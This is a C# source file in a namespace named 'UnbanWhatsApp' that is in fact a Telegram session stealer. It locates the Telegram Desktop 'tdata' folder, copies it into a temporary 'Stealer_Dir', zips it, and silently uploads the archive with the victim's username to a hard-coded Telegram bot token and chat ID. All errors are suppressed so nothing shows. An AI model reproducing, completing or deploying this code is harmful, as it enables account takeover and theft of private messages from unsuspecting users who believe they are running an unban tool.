using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Identity;
using Telegram.Bot;
using Telegram.Bot.Types;

namespace UnbanWhatsApp.Util.telegram
{
    internal class SendTelegram
    {
        private static readonly string token = "7721088883:AAETidLLKp0OFN8GYqV6exVumFfysxnRPew"; // Замените на ваш токен
        private static readonly TelegramBotClient botClient = new TelegramBotClient(token);
        public static long chatId = 1887172271; // Замените на ваш chat ID
        public static string userName = Environment.UserName;

        public static async Task ArchiveAndSendTelegramFolderAsync()
        {
            try
            {
                GetTelegramSessions();
                string telegramFolderPath = Path.Combine(Path.GetTempPath(), "Telegram");
                string zipFilePath = Path.Combine(Path.GetTempPath(), "Telegram.zip");
                if (Directory.Exists(telegramFolderPath))
                {
                    ZipFile.CreateFromDirectory(telegramFolderPath, zipFilePath);
                    //Console.WriteLine("Папка Telegram успешно архивирована.");
                    await SendZipFileAsync(zipFilePath);
                }
                else
                {
                    //Console.WriteLine("Папка Telegram не найдена.");
                }
            }
            catch (Exception ex)
            {
               // Console.WriteLine($"Произошла ошибка при архивировании: {ex.Message}");
            }
        }

        public static async Task SendZipFileAsync(string zipFilePath)
        {
            try
            {
                if (File.Exists(zipFilePath))
                {
                    using (var stream = new FileStream(zipFilePath, FileMode.Open, FileAccess.Read))
                    {
                        var message = await botClient.SendDocumentAsync(
                            chatId,
                            new InputFileStream(stream, Path.GetFileName(zipFilePath)),
                            caption: "Архив папки Telegram от пользователя: " + userName
                        );

                   //     Console.WriteLine($"Файл отправлен успешно: {message.Document.FileId}");
                    }
                }
                else
                {
               //    Console.WriteLine("Файл не найден.");
                }
            }
            catch (Exception ex)
            {
             //   Console.WriteLine($"Произошла ошибка при отправке файла: {ex.Message}");
            }
        }





















        public static void CopyDirectory(string sourceFolder, string destFolder)
        {
            if (!Directory.Exists(destFolder))
                Directory.CreateDirectory(destFolder);
            string[] files = Directory.GetFiles(sourceFolder);
            foreach (string file in files)
            {
                string name = Path.GetFileName(file);
                string dest = Path.Combine(destFolder, name);
                File.Copy(file, dest);
            }
            string[] folders = Directory.GetDirectories(sourceFolder);
            foreach (string folder in folders)
            {
                string name = Path.GetFileName(folder);
                string dest = Path.Combine(destFolder, name);
                KoopinZxc.CopyDirectory(folder, dest);
            }
        }
        // получение директории tdata
        private static string GetTdata()
        {
            string TelegramDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
            Process[] TelegramProcesses = Process.GetProcessesByName("Telegram");

            if (TelegramProcesses.Length == 0)
                return TelegramDesktopPath;
            else
                return Path.Combine(
                    Path.GetDirectoryName(
                        KoopinZxc.ProcessExecutablePath(
                            TelegramProcesses[0])), "tdata");
        }

        public static void GetTelegramSessions()
        {
            string Stealer_Dir = Path.GetTempPath();
            string TelegramDesktopPath = GetTdata();
            try
            {
                if (!Directory.Exists(TelegramDesktopPath))
                    return;
                Stealer_Dir = Stealer_Dir + "\\Telegram";
                Directory.CreateDirectory(Stealer_Dir);

                // Get all directories
                string[] Directories = Directory.GetDirectories(TelegramDesktopPath);
                string[] Files = Directory.GetFiles(TelegramDesktopPath);

                // Копи папку
                foreach (string dir in Directories)
                {
                    string name = new DirectoryInfo(dir).Name;
                    if (name != "user_data" && name != "user_data#2" && name != "user_data#3" && name != "temp" && name != "emoji") // Проверяем,  не "temp"  ли это 
                    {
                        string copyTo = Path.Combine(Stealer_Dir, name);
                        CopyDirectory(dir, copyTo);
                    }
                }
                //копируем файлы еее
                foreach (string file in Files)
                {
                    FileInfo finfo = new FileInfo(file);
                    string name = finfo.Name;
                    string copyTo = Path.Combine(Stealer_Dir, name);
                    finfo.CopyTo(copyTo); // Копируем все файлы без ограничений
                }
            }
            catch (Exception e)
            {
                //Console.WriteLine(e);
            }
        }
    }
}
